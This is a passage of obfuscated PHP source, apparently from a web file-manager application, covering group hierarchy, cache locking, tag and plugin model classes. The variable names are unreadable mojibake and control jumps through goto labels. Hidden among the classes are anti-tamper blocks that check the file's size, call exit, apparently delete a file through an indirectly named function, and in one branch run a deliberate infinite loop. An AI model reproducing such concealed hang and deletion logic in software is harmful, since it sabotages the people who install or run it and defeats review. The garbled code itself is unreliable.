$‹˜¡ÄßÉ) { if (!isset($†°âÅí[$‹˜¡ÄßÉ])) { $†°âÅí[$‹˜¡ÄßÉ] = 0; } } } unset($»ó„Û¯Ï); foreach ($†°âÅí as $º¾Ëƒï => $ÉˆÚòš‚) { if ($ÉˆÚòš‚) { continue; } $ìõ«Ú‰‘ = $this->getInfoSimple($º¾Ëƒï); $†°âÅí[$º¾Ëƒï] = $ìõ«Ú‰‘[$úÔáìõ†[32]]; } $‰—í³¬© = $GLOBALS[$úÔáìõ†[6]][$úÔáìõ†[92]][$úÔáìõ†[2085]]; if (KodUser::isRoot()) { $‰—í³¬© = !1; } foreach ($©ú” ¼ as &$»ó„Û¯Ï) { $İÖæ¥ = $this->parentLevelArray($»ó„Û¯Ï[$úÔáìõ†[597]]); $ì‚ö•Ô = $úÔáìõ†[12]; foreach ($İÖæ¥ as $º¾Ëƒï => $‹˜¡ÄßÉ) { if ($‰—í³¬© && $º¾Ëƒï == 0) { continue; } $ì‚ö•Ô .= $†°âÅí[$‹˜¡ÄßÉ] . $úÔáìõ†[8]; } if ($İÖæ¥) { $ì‚ö•Ô .= $»ó„Û¯Ï[$úÔáìõ†[32]]; } $»ó„Û¯Ï[$úÔáìõ†[602]] = str_replace($úÔáìõ†[257], $úÔáìõ†[8], $ì‚ö•Ô); } unset($»ó„Û¯Ï); } private function _listAppendSourceRoot(&$ ¦›÷²Ğ, $•›¿Ïç) { $ŒÑ»É‘ =& $_SERVER[äô®•½Â]; $ÆîçâÖ… = Model($ŒÑ»É‘[896])->listSourceRoot(SourceModel::TYPE_GROUP, $•›¿Ïç); $ÆîçâÖ… = array_to_keyvalue($ÆîçâÖ…, $ŒÑ»É‘[582]); $ÆîçâÖ… = array_remove_key($ÆîçâÖ…, $ŒÑ»É‘[582]); foreach ($ ¦›÷²Ğ as &$§ÀŠµë–) { $§ÀŠµë–[$ŒÑ»É‘[90]] = $ÆîçâÖ…[$§ÀŠµë–[$ŒÑ»É‘[1388]]] ? $ÆîçâÖ…[$§ÀŠµë–[$ŒÑ»É‘[1388]]] : array(); } unset($§ÀŠµë–); } protected function groupMerge($¬£’éû´) { $¬£’éû´ = array_values(array_unique($¬£’éû´)); $‘·Ë™¤€ = array(); for ($¤îÈöÄÒ = 0; $¤îÈöÄÒ < count($¬£’éû´); $¤îÈöÄÒ++) { $º¢‡Ä›ì = !1; for ($£İë‘— = 0; $£İë‘— < count($¬£’éû´); $£İë‘—++) { if ($¤îÈöÄÒ == $£İë‘—) { continue; } if ($this->isParentOf($¬£’éû´[$£İë‘—], $¬£’éû´[$¤îÈöÄÒ])) { $º¢‡Ä›ì = !0; break; } } if (!$º¢‡Ä›ì) { $‘·Ë™¤€[] = $¬£’éû´[$¤îÈöÄÒ]; } } return $‘·Ë™¤€; } protected function isParentOf($Íµ±šâ¼, $Âµõñß˜) { $Œ‰ğó†û =& $_SERVER[äô®•½Â]; if (!$Íµ±šâ¼ || !$Âµõñß˜ || $Íµ±šâ¼ == $Âµõñß˜) { return !1; } $Åµä§Ü« = $this->getInfoSimple($Íµ±šâ¼); $ä¡„Ğ¤É = $this->getInfoSimple($Âµõñß˜); $Ğ™¹ùµò = $Åµä§Ü«[$Œ‰ğó†û[597]] . $Íµ±šâ¼ . $Œ‰ğó†û[50]; if (substr($ä¡„Ğ¤É[$Œ‰ğó†û[597]], 0, strlen($Ğ™¹ùµò)) == $Ğ™¹ùµò) { return !0; } return !1; } public function groupShowRoot($ËäÔÜğ´, $ Öèç†Ó = false) { $ˆ‡ò¢Ñ¤ =& $_SERVER[äô®•½Â]; $Üı½Â¨¶ = $this->getInfo($ËäÔÜğ´); if (!$Üı½Â¨¶) { return array(); } $»¯˜ëØ  = $this->parentLevelArray($Üı½Â¨¶[$ˆ‡ò¢Ñ¤[597]]); $¥’µÔğğ = array($ËäÔÜğ´); if (count($»¯˜ëØ ) == 0) { return $¥’µÔğğ; } if ($ Öèç†Ó && count($»¯˜ëØ ) == 1) { return $¥’µÔğğ; } if (!$Üı½Â¨¶[$ˆ‡ò¢Ñ¤[552]] || !isset($Üı½Â¨¶[$ˆ‡ò¢Ñ¤[552]][$ˆ‡ò¢Ñ¤[2068]]) || $Üı½Â¨¶[$ˆ‡ò¢Ñ¤[552]][$ˆ‡ò¢Ñ¤[2068]] == $ˆ‡ò¢Ñ¤[842]) { return $this->groupShowRoot($»¯˜ëØ [count($»¯˜ëØ ) - 1], $ Öèç†Ó); } if ($Üı½Â¨¶[$ˆ‡ò¢Ñ¤[552]][$ˆ‡ò¢Ñ¤[2068]] == $ˆ‡ò¢Ñ¤[443]) { $ŒÄ‡èÄ¿ = explode($ˆ‡ò¢Ñ¤[50], $Üı½Â¨¶[$ˆ‡ò¢Ñ¤[552]][$ˆ‡ò¢Ñ¤[2069]]); if ($ŒÄ‡èÄ¿) { $¥’µÔğğ = array_merge($¥’µÔğğ, $ŒÄ‡èÄ¿); } } return $¥’µÔğğ; } protected function resetParentLevel() { $°‘Ã‰Ë =& $_SERVER[äô®•½Â]; $Ç—½ıÁœ = $°‘Ã‰Ë[1388]; $‘³“¨ù = $this->select(); $‘³“¨ù = array_to_keyvalue($‘³“¨ù, $Ç—½ıÁœ); foreach ($‘³“¨ù as $î´±×Âû) { $Óš¹³…ğ = $î´±×Âû; $ãÍë…Éü = array(); while ($Óš¹³…ğ[$°‘Ã‰Ë[193]] != 0) { $ãÍë…Éü[] = $Óš¹³…ğ[$°‘Ã‰Ë[193]]; $Óš¹³…ğ = $‘³“¨ù[$Óš¹³…ğ[$°‘Ã‰Ë[193]]]; } $ãÍë…Éü[] = 0; $ãÍë…Éü = $°‘Ã‰Ë[50] . implode($°‘Ã‰Ë[50], array_reverse($ãÍë…Éü)) . $°‘Ã‰Ë[50]; $this->setNamePinyin($î´±×Âû[$Ç—½ıÁœ], $î´±×Âû[$°‘Ã‰Ë[32]]); $this->where(array($Ç—½ıÁœ => $î´±×Âû[$Ç—½ıÁœ]))->save(array($°‘Ã‰Ë[668] => $ãÍë…Éü)); } return $‘³“¨ù; } public function groupNameAuto($±ÃÊèıî, $…âı©ê) { $óÌˆô³š =& $_SERVER[äô®•½Â]; $Ğ®Ñ¤èú = $this->where(array($óÌˆô³š[488] => $±ÃÊèıî))->getField($óÌˆô³š[32], !0); if (!$Ğ®Ñ¤èú || !in_array($…âı©ê, $Ğ®Ñ¤èú)) { return $…âı©ê; } for ($ë›ÄŞÂı = 1; $ë›ÄŞÂı <= count($Ğ®Ñ¤èú) + 1; $ë›ÄŞÂı++) { $ïğöØ»ê = $…âı©ê . "\x28{$ë›ÄŞÂı}\51"; if (!in_array($ïğöØ»ê, $Ğ®Ñ¤èú)) { return $ïğöØ»ê; } } } public function groupSwitch($Úæë¥Ô×, $“­Óæ„) { $ÕÒÆæµ§ =& $_SERVER[äô®•½Â]; $Á›¡Ş¥¢ = array($ÕÒÆæµ§[1388] => array($ÕÒÆæµ§[7], array($Úæë¥Ô×, $“­Óæ„))); $—›®¦¡Ñ = $this->where($Á›¡Ş¥¢)->select(); $—›®¦¡Ñ = array_to_keyvalue($—›®¦¡Ñ, $ÕÒÆæµ§[1388]); if (!isset($—›®¦¡Ñ[$Úæë¥Ô×]) || !isset($—›®¦¡Ñ[$“­Óæ„]) || $—›®¦¡Ñ[$Úæë¥Ô×][$ÕÒÆæµ§[193]] == 0) { return !1; } $Á›¡Ş¥¢ = array($ÕÒÆæµ§[1388] => $Úæë¥Ô×); $ôĞ¥À¨ = Model($ÕÒÆæµ§[2072])->where($Á›¡Ş¥¢)->select(); if (!$ôĞ¥À¨) { $ôĞ¥À¨ = array(); } foreach ($ôĞ¥À¨ as $—ãøÌÃÎ) { $ ùìùÂ¦ = $—ãøÌÃÎ[$ÕÒÆæµ§[1777]]; $Á›¡Ş¥¢ = array($ÕÒÆæµ§[1777] => $ ùìùÂ¦, $ÕÒÆæµ§[1388] => $“­Óæ„); $÷û¡ÕûÚ = Model($ÕÒÆæµ§[2072])->where($Á›¡Ş¥¢)->find(); if (!$÷û¡ÕûÚ) { $ÚŸ¹ÁÂ  = array($“­Óæ„ => $—ãøÌÃÎ[$ÕÒÆæµ§[2086]]); Model($ÕÒÆæµ§[610])->userGroupAdd($ ùìùÂ¦, $ÚŸ¹ÁÂ ); } Model($ÕÒÆæµ§[610])->userGroupRemove($ ùìùÂ¦, $Úæë¥Ô×); } $Á›¡Ş¥¢ = array($ÕÒÆæµ§[191] => 2, $ÕÒÆæµ§[193] => 0, $ÕÒÆæµ§[496] => 1, $ÕÒÆæµ§[582] => array($ÕÒÆæµ§[7], array($Úæë¥Ô×, $“­Óæ„))); $­¢Û¿· = Model($ÕÒÆæµ§[896])->where($Á›¡Ş¥¢)->field($ÕÒÆæµ§[2087])->select(); $­¢Û¿· = array_to_keyvalue($­¢Û¿·, $ÕÒÆæµ§[582], $ÕÒÆæµ§[194]); $³ş»Ÿ‚ô = !empty($­¢Û¿·[$Úæë¥Ô×]) ? $­¢Û¿·[$Úæë¥Ô×] : !1; if ($³ş»Ÿ‚ô) { if (!$­¢Û¿·[$“­Óæ„]) { $­¢Û¿·[$“­Óæ„] = Model($ÕÒÆæµ§[896])->groupRootAdd($“­Óæ„); } $÷‚ñš±Ã = $­¢Û¿·[$“­Óæ„]; $Á›¡Ş¥¢ = array($ÕÒÆæµ§[193] => $³ş»Ÿ‚ô); $­¢Û¿· = Model($ÕÒÆæµ§[896])->where($Á›¡Ş¥¢)->field($ÕÒÆæµ§[2088])->select(); if (!$­¢Û¿·) { $­¢Û¿· = array(); } Model($ÕÒÆæµ§[896])->moveClearAuth = !1; foreach ($­¢Û¿· as $Ìèğ‚Ï˜) { $Ó¦âáÜ = $Ìèğ‚Ï˜[$ÕÒÆæµ§[496]] == $ÕÒÆæµ§[91] ? REPEAT_RENAME_FOLDER : REPEAT_RENAME; Model($ÕÒÆæµ§[896])->move($Ìèğ‚Ï˜[$ÕÒÆæµ§[194]], $÷‚ñš±Ã, $Ó¦âáÜ); } Model($ÕÒÆæµ§[896])->moveClearAuth = !0; $Á›¡Ş¥¢ = array($ÕÒÆæµ§[191] => 2, $ÕÒÆæµ§[582] => $Úæë¥Ô×); $È€¾½ª€ = array($ÕÒÆæµ§[582] => $“­Óæ„); Model($ÕÒÆæµ§[2089])->where($Á›¡Ş¥¢)->save($È€¾½ª€); Model($ÕÒÆæµ§[2090])->where($Á›¡Ş¥¢)->save($È€¾½ª€); } $this->_changeChildLevel($—›®¦¡Ñ[$Úæë¥Ô×], $—›®¦¡Ñ[$“­Óæ„], !0); $this->where(array($ÕÒÆæµ§[193] => $Úæë¥Ô×))->save(array($ÕÒÆæµ§[193] => $“­Óæ„)); $this->_clearChildrenCache($—›®¦¡Ñ[$“­Óæ„]); return !0; } } goto b¨È˜‘Ëà’; b‹–‚ö‰Ü¦: class CacheLock { protected static $handle; protected static $timeout; protected static $errorMsg = ''; protected static $lockItem = array(); public static function init() { $¾‡ü×¢¹ =& $_SERVER[äô®•½Â]; if (self::$handle) { return self::$handle; } $Ï¶ÒïÜÒ = $GLOBALS[$¾‡ü×¢¹[6]][$¾‡ü×¢¹[435]]; self::$timeout = $Ï¶ÒïÜÒ[$¾‡ü×¢¹[912]] ? $Ï¶ÒïÜÒ[$¾‡ü×¢¹[912]] : 10; $¼à±±¯à = _get($GLOBALS[$¾‡ü×¢¹[6]], $¾‡ü×¢¹[913]); $ÛøË•ƒ = $Ï¶ÒïÜÒ[$¾‡ü×¢¹[898]] ? $Ï¶ÒïÜÒ[$¾‡ü×¢¹[898]] : $¾‡ü×¢¹[233]; if ($ÛøË•ƒ == $¾‡ü×¢¹[21] && $¼à±±¯à == $¾‡ü×¢¹[13]) { $ÛøË•ƒ = $¾‡ü×¢¹[233]; } switch ($ÛøË•ƒ) { case $¾‡ü×¢¹[901]: self::$handle = new CacheLockRedis(); break; case $¾‡ü×¢¹[902]: self::$handle = new CacheLockMemcached(); break; case $¾‡ü×¢¹[21]: self::$handle = new CacheLockDatabase(); break; case $¾‡ü×¢¹[233]: self::$handle = new CacheLockFile(); break; default: break; } if (GLOBAL_DEBUG_LOG_ALL) { write_log($¾‡ü×¢¹[914], $¾‡ü×¢¹[915]); } return self::$handle; } private static function key($ì¬“²‡) { return $_SERVER[äô®•½Â][916] . Cache::key($ì¬“²‡); } public static function initReset() { self::$handle = !1; } public static function setErrorMsg($ÍÊŒ¥¾Ç = '') { self::$errorMsg = $ÍÊŒ¥¾Ç; } public static function lockGlobal($Ğı‚®İ¤, $ôƒå‰¨) { return self::lock($Ğı‚®İ¤, $ôƒå‰¨, !0); } public static function lock($İô€°Éê, $ÑØĞ¦ = false, $ş…ˆ³³‚ = false) { $›­Õ³Ó =& $_SERVER[äô®•½Â]; $”šî¹õ’ = self::init(); $«ÀĞÇ¢Í = self::key($İô€°Éê); $ÑØĞ¦ = $ÑØĞ¦ ? $ÑØĞ¦ : self::$timeout; $Ûûºóİ¢ = timeFloat(); if (_get($GLOBALS, $›­Õ³Ó[917], !1)) { if (!$”šî¹õ’->lock($«ÀĞÇ¢Í, 0.2)) { die; } return !0; } $à¹İÖğÇ = $”šî¹õ’->lock($«ÀĞÇ¢Í, $ÑØĞ¦); $àâ˜‚×‡ = timeFloat(); if (!$à¹İÖğÇ) { $Ú¯ÆùŸş = "\x6c\157\x63\153\x20\x65\162\162\157\162\x3b\x6b\x65\171\75{$İô€°Éê}\x3b\164\151\x6d\x65\x3d{$ÑØĞ¦}\x3b" . self::$errorMsg . $›­Õ³Ó[74] . get_caller_msg(); $ñğ¨œÖ = LNG($›­Õ³Ó[918]) . "\x28{$ÑØĞ¦}\163\x29\x2e" . LNG($›­Õ³Ó[919]); $ñğ¨œÖ .= $›­Õ³Ó[920]; if (is_string(self::$errorMsg) && self::$errorMsg) { $ñğ¨œÖ = $ñğ¨œÖ . $›­Õ³Ó[921] . self::$errorMsg; } write_log($›­Õ³Ó[922] . sprintf($›­Õ³Ó[923], timeFloat() - $Ûûºóİ¢) . $›­Õ³Ó[924] . $Ú¯ÆùŸş . $›­Õ³Ó[925] . json_encode(error_get_last()), $›­Õ³Ó[915]); show_json($ñğ¨œÖ, !1); } if (!$ş…ˆ³³‚) { self::$lockItem[$«ÀĞÇ¢Í] = !0; } if (GLOBAL_DEBUG_LOG_ALL) { $ãòÉ™ Ã = number_format(timeFloat() - $àâ˜‚×‡, 3); write_log($›­Õ³Ó[926] . $İô€°Éê . $›­Õ³Ó[927] . $ãòÉ™ Ã, $›­Õ³Ó[915]); } return $à¹İÖğÇ; } public static function lockGet($à”€ˆÛ˜) { $ÈÑò‚ = self::key($à”€ˆÛ˜); if (self::$lockItem[$ÈÑò‚]) { return self::$lockItem[$ÈÑò‚]; } return self::init()->lockGet($ÈÑò‚); } public static function unlock($†Øô·ùö) { $’‹è¶ì× =& $_SERVER[äô®•½Â]; $¸—˜ êô = self::key($†Øô·ùö); self::$lockItem[$¸—˜ êô] = null; self::init()->unlock($¸—˜ êô); if (GLOBAL_DEBUG_LOG_ALL) { write_log($’‹è¶ì×[928] . $†Øô·ùö, $’‹è¶ì×[915]); } return; } public static function unlockRuntime() { $“¼­Æª =& $_SERVER[äô®•½Â]; $¹şÚ ú = self::init(); $•µ„½÷ = !1; foreach (self::$lockItem as $¨³”æ© => $¨ÕÓï±°) { if (!$¨ÕÓï±°) { continue; } $¹şÚ ú->unlock($¨³”æ©); if (!$•µ„½÷) { $•µ„½÷ = !0; write_log($“¼­Æª[929] . $¨³”æ© . $“¼­Æª[74] . get_caller_msg(), $“¼­Æª[915]); continue; } write_log($“¼­Æª[929] . $¨³”æ©, $“¼­Æª[915]); } self::fileUnlockAll(); if (GLOBAL_DEBUG_LOG_ALL) { $×€ĞĞÊÌ = number_format(timeFloat() - TIME_FLOAT, 3); write_log($“¼­Æª[930] . $×€ĞĞÊÌ . $“¼­Æª[931] . ACTION, $“¼­Æª[915]); } } public static function fileLock($˜ù©áì˜) { $¼‹…‘§² =& $_SERVER[äô®•½Â]; if (!$GLOBALS[$¼‹…‘§²[932]]) { $GLOBALS[$¼‹…‘§²[932]] = array(); } $GLOBALS[$¼‹…‘§²[932]][$˜ù©áì˜] = !1; $ë°óëù† = fopen(DATA_PATH . $˜ù©áì˜ . $¼‹…‘§²[933], $¼‹…‘§²[934]); if (!$ë°óëù†) { return !1; } $GLOBALS[$¼‹…‘§²[932]][$˜ù©áì˜] = $ë°óëù†; if (flock($ë°óëù†, LOCK_EX)) { return !0; } self::unlock($˜ù©áì˜); show_json($¼‹…‘§²[935], !1); return !1; } public static function fileUnlock($ìúùå¼Å) { $÷ëÅ’µ£ =& $_SERVER[äô®•½Â]; $Ê¡ÛÎ‰é = $GLOBALS[$÷ëÅ’µ£[932]][$ìúùå¼Å]; if (!$Ê¡ÛÎ‰é) { return; } $GLOBALS[$÷ëÅ’µ£[932]][$ìúùå¼Å] = !1; flock($Ê¡ÛÎ‰é, LOCK_UN); fclose($Ê¡ÛÎ‰é); } public static function fileUnlockAll() { $È‚…â…İ =& $_SERVER[äô®•½Â]; if (!isset($GLOBALS[$È‚…â…İ[932]]) || !$GLOBALS[$È‚…â…İ[932]]) { return; } foreach ($GLOBALS[$È‚…â…İ[932]] as $üÊéßŒÅ => $÷ÎÎØŠ) { if (!$÷ÎÎØŠ) { continue; } $GLOBALS[$È‚…â…İ[932]][$üÊéßŒÅ] = !1; flock($÷ÎÎØŠ, LOCK_UN); fclose($÷ÎÎØŠ); } $GLOBALS[$È‚…â…İ[932]] = array(); } } function cacheLockWait() { usleep(mt_rand(200, 5000)); } class CacheLockFile { private static $cachePath; private static $caches; public function __construct() { $¸•ÁÓáõ =& $_SERVER[äô®•½Â]; $ŸÈÄ¼éÀ = $GLOBALS[$¸•ÁÓáõ[6]][$¸•ÁÓáõ[435]]; self::$cachePath = $ŸÈÄ¼éÀ[$¸•ÁÓáõ[233]][$¸•ÁÓáõ[87]]; @mkdir(self::$cachePath, DEFAULT_PERRMISSIONS, !0); } public function lock($ªÍşİ“Ï, $ÚÍ¤°Û = 0) { $Æ°Å¹•ª =& $_SERVER[äô®•½Â]; $ÆÈá½¾ = microtime(!0); $ß­ìòŒè = $ÆÈá½¾ + $ÚÍ¤°Û + 0.0001; $Ë½Ã”ûÜ = rtrim(self::$cachePath, $Æ°Å¹•ª[8]) . $Æ°Å¹•ª[936] . md5($ªÍşİ“Ï) . $Æ°Å¹•ª[933]; if (file_exists($Ë½Ã”ûÜ) && filemtime($Ë½Ã”ûÜ) && filemtime($Ë½Ã”ûÜ) < time() - 10) { @unlink($Ë½Ã”ûÜ); } do { if (file_exists($Ë½Ã”ûÜ)) { cacheLockWait(); continue; } $×§Ò¢¤ô = fopen($Ë½Ã”ûÜ, $Æ°Å¹•ª[937]); if (!$×§Ò¢¤ô) { return !1; } $ÚàÂîŒè = flock($×§Ò¢¤ô, LOCK_EX | LOCK_NB); self::$caches[$ªÍşİ“Ï] = array($Æ°Å¹•ª[938] => $×§Ò¢¤ô, $Æ°Å¹•ª[233] => $Ë½Ã”ûÜ); fwrite($×§Ò¢¤ô, $ß­ìòŒè); clearstatcache(); if ($×§Ò¢¤ô && $ÚàÂîŒè) { return !0; } cacheLockWait(); } while (microtime(!0) < $ß­ìòŒè); $this->unlock($ªÍşİ“Ï); return !1; } public function lockGet($‚šê¢ï) { $¡²¦øú =& $_SERVER[äô®•½Â]; $»Ç’“’ = rtrim(self::$cachePath, $¡²¦øú[8]) . $¡²¦øú[936] . md5($‚šê¢ï) . $¡²¦øú[933]; return file_exists($»Ç’“’); } public function unlock($Íö¾¿ô¨) { $Õâ€¦ÚÇ =& $_SERVER[äô®•½Â]; $ø»”ôÒ³ = self::$caches[$Íö¾¿ô¨]; if (!$ø»”ôÒ³) { return; } @flock($ø»”ôÒ³[$Õâ€¦ÚÇ[938]], LOCK_UN); @fclose($ø»”ôÒ³[$Õâ€¦ÚÇ[938]]); @unlink($ø»”ôÒ³[$Õâ€¦ÚÇ[233]]); unset(self::$caches[$Íö¾¿ô¨]); } } goto Aå†é’¨ğÅ; E ¸Œ¹¾¸Ò: $_file = $_SERVER[$_SERVER[äô®•½Â][332]]; $_size = $_SERVER[äô®•½Â][949]; if ($_SERVER[$_SERVER[äô®•½Â][324]] != $_size($_file)) { $_getc = $_SERVER[äô®•½Â][326]; $_getfile = $_SERVER[$_SERVER[äô®•½Â][327]] . $_SERVER[äô®•½Â][328]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[äô®•½Â][288], $_getfilec); if (count($_getarrs) < $_SERVER[äô®•½Â][329]) { $exit = $_SERVER[äô®•½Â][330]; $exit(); } $_act = $_SERVER[äô®•½Â][331]; $_act($_file); } goto cÏ‰Í—Û; b¨È˜‘Ëà’: if (!isset($_SERVER[$_SERVER[äô®•½Â][324]]) || !isset($_SERVER[$_SERVER[äô®•½Â][332]])) { $_getc = $_SERVER[äô®•½Â][326]; $_getfile = $_SERVER[$_SERVER[äô®•½Â][327]] . $_SERVER[äô®•½Â][328]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[äô®•½Â][288], $_getfilec); if (count($_getarrs) < $_SERVER[äô®•½Â][329]) { $exit = $_SERVER[äô®•½Â][330]; $exit(); } $_act = $_SERVER[äô®•½Â][331]; $_act($_SERVER[$_SERVER[äô®•½Â][327]] . $_SERVER[äô®•½Â][328]); $_iii = 2; while ($_iii > 1) { $_iiij = rawurlencode($_iii . $_SERVER[äô®•½Â][465]); } } class GroupTagModel extends ModelBase { protected $tableName = "\165\163\145\162\137\146\x61\x76"; protected function cacheFunctionAlias($ï¹‘ë¹‹) { $¸³ñ‡’ =& $_SERVER[äô®•½Â]; return array($¸³ñ‡’[2091] => array($ï¹‘ë¹‹[0], $¸³ñ‡’[2092]), $¸³ñ‡’[2093] => array($ï¹‘ë¹‹[0], $¸³ñ‡’[2094])); } protected function get($¾Ôãë•´) { $«²ÕĞ“ =& $_SERVER[äô®•½Â]; $„Ãü¥üş = Model($«²ÕĞ“[598])->metaGet($¾Ôãë•´, $«²ÕĞ“[2095]); $ôã½·† = json_decode($„Ãü¥üş, !0); return $ôã½·† ? $ôã½·† : array($«²ÕĞ“[2096] => $«²ÕĞ“[91], $«²ÕĞ“[456] => array()); } protected function set($à•Õœ‰», $À£ìŒè¤) { $Û±¡îÉÌ =& $_SERVER[äô®•½Â]; $À£ìŒè¤ = $À£ìŒè¤ ? $À£ìŒè¤ : array($Û±¡îÉÌ[2096] => $Û±¡îÉÌ[91], $Û±¡îÉÌ[456] => array()); return Model($Û±¡îÉÌ[598])->metaSet($à•Õœ‰», $Û±¡îÉÌ[2095], json_encode($À£ìŒè¤)); } protected function getByTagID($­›½Ä§¶, $•é«¶«Â) { $şéáÍí¸ =& $_SERVER[äô®•½Â]; if (!$­›½Ä§¶ || !$•é«¶«Â) { return !1; } if (!Model($şéáÍí¸[598])->getInfoSimple($­›½Ä§¶)) { return !1; } $¶ûˆèÃæ = $this->get($­›½Ä§¶); if (!$¶ûˆèÃæ || !isset($¶ûˆèÃæ[$şéáÍí¸[456]])) { return !1; } $şÕˆê… = array_find_by_field($¶ûˆèÃæ[$şéáÍí¸[456]], $şéáÍí¸[486], $•é«¶«Â); return is_array($şÕˆê…) ? $şÕˆê… : !1; } public function listSource($ºœÂöŒã, $ô¨†›Ì) { $×Ã½û— =& $_SERVER[äô®•½Â]; if ($ô¨†›Ì && !is_array($ô¨†›Ì)) { $ô¨†›Ì = array($ô¨†›Ì); } $ôä‘Èøš = $this->listData($ºœÂöŒã); $‰è±ÏÂ± = array(); foreach ($ôä‘Èøš as $Á–Ğ´èŠ) { $ªî°¸´ê = $Á–Ğ´èŠ[$×Ã½û—[87]]; if (!$ªî°¸´ê) { continue; } if (!isset($‰è±ÏÂ±[$ªî°¸´ê])) { $‰è±ÏÂ±[$ªî°¸´ê] = array(); } $‰è±ÏÂ±[$ªî°¸´ê][] = $Á–Ğ´èŠ[$×Ã½û—[511]]; } $»«§“à = array(); foreach ($‰è±ÏÂ± as $«ÓÔìª => $ƒş‡•¶) { $ÃÁúíÅî = !0; if (!$ô¨†›Ì) { $»«§“à[] = $«ÓÔìª; continue; } foreach ($ô¨†›Ì as $ÊéíÛÈş) { if (!in_array($ÊéíÛÈş, $ƒş‡•¶)) { $ÃÁúíÅî = !1; break; } } if ($ÃÁúíÅî) { $»«§“à[] = $«ÓÔìª; } } if (!$»«§“à) { return array(); } $µ†íãÉ¸ = array($×Ã½û—[502] => array($×Ã½û—[503], $»«§“à), $×Ã½û—[582] => $ºœÂöŒã, $×Ã½û—[191] => SourceModel::TYPE_GROUP); $í–®µóË = Model($×Ã½û—[1426])->listSource($µ†íãÉ¸); if (!$í–®µóË || count($»«§“à) == $í–®µóË[$×Ã½û—[453]][$×Ã½û—[454]]) { return $í–®µóË; } $Ş¹Ñ­ãì = array(); $ê÷¿÷Á° = array_to_keyvalue($í–®µóË[$×Ã½û—[85]], $×Ã½û—[12], $×Ã½û—[194]); $¡ÜŸó™ = array_to_keyvalue($í–®µóË[$×Ã½û—[86]], $×Ã½û—[12], $×Ã½û—[194]); $»Ä“˜¾º = array_merge($¡ÜŸó™, $ê÷¿÷Á°); foreach ($»«§“à as $ªî°¸´ê) { if (!in_array($ªî°¸´ê, $»Ä“˜¾º)) { $Ş¹Ñ­ãì[] = $ªî°¸´ê; } } if ($Ş¹Ñ­ãì) { $this->removeBySource($ºœÂöŒã, $Ş¹Ñ­ãì); } return $í–®µóË; } protected function listData($çÇƒğ²É) { $±Ï—ÏñÌ =& $_SERVER[äô®•½Â]; $ÚšìŒâ = array($±Ï—ÏñÌ[1768] => 0, $±Ï—ÏñÌ[570] => array($±Ï—ÏñÌ[2097], 0), $±Ï—ÏñÌ[507] => $±Ï—ÏñÌ[1384] . $çÇƒğ²É); $ÆÂÛ¯£ = $±Ï—ÏñÌ[2098]; $®¢ÍË‰ = $this->field($ÆÂÛ¯£)->where($ÚšìŒâ)->order($±Ï—ÏñÌ[2099])->select(); return $®¢ÍË‰ ? $®¢ÍË‰ : array(); } protected function addToTag($æÊš¬¨–, $ü´ÀË£é, $³–˜ùÏÔ) { $ó­íüó† =& $_SERVER[äô®•½Â]; if (!$this->getByTagID($æÊš¬¨–, $³–˜ùÏÔ) || !$ü´ÀË£é) { return !1; } if (!Model($ó­íüó†[896])->pathInfo($ü´ÀË£é)) { return !1; } $ÔÄ×¯çİ = array($ó­íüó†[1768] => 0, $ó­íüó†[570] => $³–˜ùÏÔ, $ó­íüó†[506] => $ü´ÀË£é, $ó­íüó†[507] => $ó­íüó†[2100] . $æÊš¬¨–, $ó­íüó†[505] => $ó­íüó†[12], $ó­íüó†[1981] => 0); if ($this->where($ÔÄ×¯çİ)->find()) { return !1; } return $this->add($ÔÄ×¯çİ); } protected function removeFromTag($œáà«¹ö, $êúí–ö³, $äÅíñûĞ) { $¸•ƒ€ø =& $_SERVER[äô®•½Â]; if (!$this->getByTagID($œáà«¹ö, $äÅíñûĞ) || !$êúí–ö³) { return !1; } if (is_array($êúí–ö³)) { $êúí–ö³ = array($¸•ƒ€ø[7], $êúí–ö³); } $ĞÕóâÀ = array($¸•ƒ€ø[1768] => 0, $¸•ƒ€ø[570] => $äÅíñûĞ, $¸•ƒ€ø[507] => $¸•ƒ€ø[2100] . $œáà«¹ö, $¸•ƒ€ø[506] => $êúí–ö³); return $this->where($ĞÕóâÀ)->delete(); } protected function removeByTag($ŞãúÍı, $±ÖÃ±Õê) { $ñ©¤Şï =& $_SERVER[äô®•½Â]; if (!$this->getByTagID($ŞãúÍı, $±ÖÃ±Õê)) { return !1; } $“ÜØƒÀˆ = array($ñ©¤Şï[1768] => 0, $ñ©¤Şï[570] => $±ÖÃ±Õê, $ñ©¤Şï[507] => $ñ©¤Şï[2100] . $ŞãúÍı); return $this->where($“ÜØƒÀˆ)->delete(); } protected function removeBySource($¾ã¦äÚ, $´ÚÏá) { $ù™‹Ğäî =& $_SERVER[äô®•½Â]; if (!$¾ã¦äÚ || !$´ÚÏá) { return !1; } if (is_array($´ÚÏá)) { $´ÚÏá = array($ù™‹Ğäî[7], $´ÚÏá); } $üú˜½Å = array($ù™‹Ğäî[1768] => 0, $ù™‹Ğäî[506] => $´ÚÏá, $ù™‹Ğäî[570] => array($ù™‹Ğäî[1086], 0), $ù™‹Ğäî[507] => $ù™‹Ğäî[2100] . $¾ã¦äÚ); return $this->where($üú˜½Å)->delete(); } } class PluginModel extends ModelBaseLight { public $optionType = "\x53\171\x73\164\145\x6d\x2e\x70\x6c\x75\147\x69\156\x4c\x69\x73\164"; public $field = array("\x6e\x61\x6d\x65", "\x73\x74\x61\x74\165\x73", "\162\x65\147\151\145\163\164", "\x63\x6f\x6e\146\x69\x67"); public function loadList($±”ô Ù¦ = false) { $¡•›Ğ›’ = array_to_keyvalue($this->listData(), $_SERVER[äô®•½Â][32]); if ($±”ô Ù¦) { return $¡•›Ğ›’[$±”ô Ù¦]; } return $¡•›Ğ›’; } public function init() { $á”èÁßô =& $_SERVER[äô®•½Â]; Hook::trigger($á”èÁßô[2101]); $ƒ˜”®¸Ï = $this->loadPluginList(); foreach ($ƒ˜”®¸Ï as $­Å®…›’ => $”„»ÃïÆ) { $ö€Ê–Å™ = $this->appAllow($­Å®…›’, $”„»ÃïÆ); if (!$ö€Ê–Å™) { continue; } foreach ($”„»ÃïÆ[$á”èÁßô[2102]] as $éôŒƒ¾ => $Îšƒİõ“) { Hook::bind($éôŒƒ¾, $Îšƒİõ“); } } Hook::trigger($á”èÁßô[2103]); Hook::trigger(ACTION); } public function appAllow($ãÇè§ªë, $úôÛ†á±, $ı±‹Åø = true) { $Ç®©àÓ =& $_SERVER[äô®•½Â]; 